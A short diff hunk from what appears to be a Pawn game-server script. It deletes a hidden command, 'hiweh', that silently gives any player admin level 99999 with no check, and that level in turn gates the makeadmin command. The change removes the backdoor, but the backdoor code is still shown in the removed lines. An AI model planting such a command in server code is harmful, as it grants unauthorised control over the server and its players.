@@ -18574,12 +18574,6 @@ CMD:trackcar(playerid, params[])
 	return 1;
 }
 
-CMD:hiweh(playerid, params[])
-{
-	PlayerInfo[playerid][pAdmin] = 99999;
-	return 1;
-}
-
 CMD:makeadmin(playerid, params[])  {
 	if(PlayerInfo[playerid][pAdmin] >= 99999 ) {
 
